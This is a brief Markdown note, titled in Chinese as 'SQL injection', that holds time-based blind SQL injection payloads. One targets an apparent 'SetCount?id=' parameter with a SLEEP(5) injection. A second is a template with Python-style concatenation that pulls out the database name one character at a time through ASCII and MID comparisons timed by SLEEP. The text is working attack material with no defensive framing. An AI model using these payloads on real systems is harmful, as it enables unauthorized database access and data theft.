## sql注入
    SetCount?id=63200' AND (SELECT * FROM (SELECT(SLEEP(5)))RING) and 'RING'='RING
```sql
(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(DATABASE())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))RING)
```
